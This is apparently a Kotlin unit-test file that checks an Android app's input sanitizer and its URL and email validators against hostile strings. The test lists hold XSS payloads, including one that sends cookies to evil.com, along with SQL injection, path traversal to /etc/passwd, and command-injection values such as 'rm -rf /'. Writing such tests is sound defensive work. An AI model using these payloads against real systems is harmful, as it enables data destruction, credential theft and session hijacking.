package com.example.uplisttracker

import org.junit.Test
import org.junit.Assert.*

/**
 * Security tests for UpListTracker.
 * These tests verify security measures and input validation.
 */
class SecurityTest {
    
    @Test
    fun testXssPrevention() {
        val maliciousInputs = listOf(
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            "<svg onload=alert('xss')>",
            "'; DROP TABLE users; --",
            "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
        )
        
        maliciousInputs.forEach { maliciousInput ->
            val sanitized = PositionUtils.sanitizeInput(maliciousInput)
            
            // Should not contain script tags
            assertFalse("Sanitized output contains script tag: $sanitized", 
                       sanitized.contains("<script>"))
            
            // Should not contain javascript: protocol
            assertFalse("Sanitized output contains javascript protocol: $sanitized", 
                       sanitized.contains("javascript:"))
            
            // Should not contain onerror attributes
            assertFalse("Sanitized output contains onerror: $sanitized", 
                       sanitized.contains("onerror"))
            
            // Should not contain onload attributes
            assertFalse("Sanitized output contains onload: $sanitized", 
                       sanitized.contains("onload"))
        }
    }
    
    @Test
    fun testSqlInjectionPrevention() {
        val sqlInjectionAttempts = listOf(
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'; --"
        )
        
        sqlInjectionAttempts.forEach { injection ->
            val sanitized = PositionUtils.sanitizeInput(injection)
            
            // Should not contain SQL keywords in dangerous context
            assertFalse("Sanitized output contains dangerous SQL: $sanitized", 
                       sanitized.contains("DROP TABLE"))
            assertFalse("Sanitized output contains dangerous SQL: $sanitized", 
                       sanitized.contains("INSERT INTO"))
            assertFalse("Sanitized output contains dangerous SQL: $sanitized", 
                       sanitized.contains("UPDATE"))
            assertFalse("Sanitized output contains dangerous SQL: $sanitized", 
                       sanitized.contains("UNION SELECT"))
        }
    }
    
    @Test
    fun testEmailValidationSecurity() {
        val invalidEmails = listOf(
            "test@",
            "@example.com",
            "test..test@example.com",
            "test@.com",
            "test@example.",
            "test@example..com",
            "test@@example.com",
            "test@example@com",
            "test@example.com.",
            ".test@example.com",
            "test@example.com..",
            "test@example..com",
            "test@example.com@",
            "@test@example.com"
        )
        
        invalidEmails.forEach { email ->
            assertFalse("Invalid email should be rejected: $email", 
                       PositionUtils.validateCredentials(email, "password"))
        }
    }
    
    @Test
    fun testUrlValidationSecurity() {
        val dangerousUrls = listOf(
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "file:///etc/passwd",
            "ftp://evil.com/steal",
            "gopher://evil.com/",
            "mailto:evil@example.com",
            "tel:+1234567890",
            "about:blank",
            "chrome://settings",
            "moz-extension://",
            "view-source:https://example.com"
        )
        
        dangerousUrls.forEach { url ->
            assertFalse("Dangerous URL should be rejected: $url", 
                       PositionUtils.validateUrl(url))
        }
    }
    
    @Test
    fun testInputLengthLimits() {
        // Test extremely long inputs
        val longInput = "a".repeat(10000)
        val longEmail = "a".repeat(1000) + "@example.com"
        val longPassword = "a".repeat(1000)
        val longUrl = "https://example.com/" + "a".repeat(1000)
        
        // Should handle long inputs gracefully
        val sanitizedLong = PositionUtils.sanitizeInput(longInput)
        assertNotNull("Long input should be handled", sanitizedLong)
        
        // Should reject extremely long emails
        assertFalse("Extremely long email should be rejected", 
                   PositionUtils.validateCredentials(longEmail, "password"))
        
        // Should reject extremely long passwords
        assertFalse("Extremely long password should be rejected", 
                   PositionUtils.validateCredentials("test@example.com", longPassword))
        
        // Should reject extremely long URLs
        assertFalse("Extremely long URL should be rejected", 
                   PositionUtils.validateUrl(longUrl))
    }
    
    @Test
    fun testNullByteInjection() {
        val nullByteInputs = listOf(
            "test\u0000@example.com",
            "password\u0000",
            "https://example.com\u0000",
            "position\u0000"
        )
        
        nullByteInputs.forEach { input ->
            val sanitized = PositionUtils.sanitizeInput(input)
            
            // Should not contain null bytes
            assertFalse("Sanitized output contains null byte: $sanitized", 
                       sanitized.contains("\u0000"))
        }
    }
    
    @Test
    fun testUnicodeInjection() {
        val unicodeInputs = listOf(
            "test@example.com\u2028", // Line separator
            "test@example.com\u2029", // Paragraph separator
            "test@example.com\uFEFF", // Zero-width no-break space
            "test@example.com\u200B", // Zero-width space
            "test@example.com\u200C", // Zero-width non-joiner
            "test@example.com\u200D"  // Zero-width joiner
        )
        
        unicodeInputs.forEach { input ->
            val sanitized = PositionUtils.sanitizeInput(input)
            
            // Should not contain dangerous Unicode characters
            assertFalse("Sanitized output contains dangerous Unicode: $sanitized", 
                       sanitized.contains("\u2028"))
            assertFalse("Sanitized output contains dangerous Unicode: $sanitized", 
                       sanitized.contains("\u2029"))
        }
    }
    
    @Test
    fun testPathTraversalPrevention() {
        val pathTraversalAttempts = listOf(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....//....//....//etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd"
        )
        
        pathTraversalAttempts.forEach { attempt ->
            val sanitized = PositionUtils.sanitizeInput(attempt)
            
            // Should not contain path traversal patterns
            assertFalse("Sanitized output contains path traversal: $sanitized", 
                       sanitized.contains("../"))
            assertFalse("Sanitized output contains path traversal: $sanitized", 
                       sanitized.contains("..\\"))
        }
    }
    
    @Test
    fun testCommandInjectionPrevention() {
        val commandInjectionAttempts = listOf(
            "test; rm -rf /",
            "test && rm -rf /",
            "test | rm -rf /",
            "test || rm -rf /",
            "test; cat /etc/passwd",
            "test && cat /etc/passwd",
            "test; whoami",
            "test && whoami"
        )
        
        commandInjectionAttempts.forEach { attempt ->
            val sanitized = PositionUtils.sanitizeInput(attempt)
            
            // Should not contain command injection patterns
            assertFalse("Sanitized output contains command injection: $sanitized", 
                       sanitized.contains("; rm"))
            assertFalse("Sanitized output contains command injection: $sanitized", 
                       sanitized.contains("&& rm"))
            assertFalse("Sanitized output contains command injection: $sanitized", 
                       sanitized.contains("| rm"))
            assertFalse("Sanitized output contains command injection: $sanitized", 
                       sanitized.contains("|| rm"))
        }
    }
    
    @Test
    fun testHtmlEntityInjection() {
        val htmlEntityInputs = listOf(
            "&lt;script&gt;alert('xss')&lt;/script&gt;",
            "&#60;script&#62;alert('xss')&#60;/script&#62;",
            "&#x3c;script&#x3e;alert('xss')&#x3c;/script&#x3e;",
            "&lt;img src=x onerror=alert('xss')&gt;"
        )
        
        htmlEntityInputs.forEach { input ->
            val sanitized = PositionUtils.sanitizeInput(input)
            
            // Should properly decode and sanitize HTML entities
            assertFalse("Sanitized output contains script tag: $sanitized", 
                       sanitized.contains("<script>"))
            assertFalse("Sanitized output contains img tag: $sanitized", 
                       sanitized.contains("<img"))
        }
    }
} 